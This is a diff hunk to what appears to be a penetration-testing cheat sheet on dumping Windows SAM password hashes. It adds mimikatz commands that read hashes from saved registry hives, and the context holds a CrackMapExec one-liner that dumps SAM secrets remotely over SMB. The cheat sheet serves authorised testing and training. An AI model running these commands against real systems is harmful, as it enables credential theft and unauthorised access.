@@ -53,6 +53,13 @@ Three registry hives required to dump the SAM secrets:
 	```
 - Use [Hash Crack Technique](#hash-crack-technique) mentioned above to crack the dumped hashes.
 
+Or use mimikatz locally.
+```Powershell
+PS C:\> .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::sam /system:system.save /sam:sam.save
+```
+
 > [!Note]
 > CrackMapExec can accomplish the same steps shown above, all with one command.
 > `crackmapexec smb <IP> --local-auth -u <UserName> -p <Password> --sam`
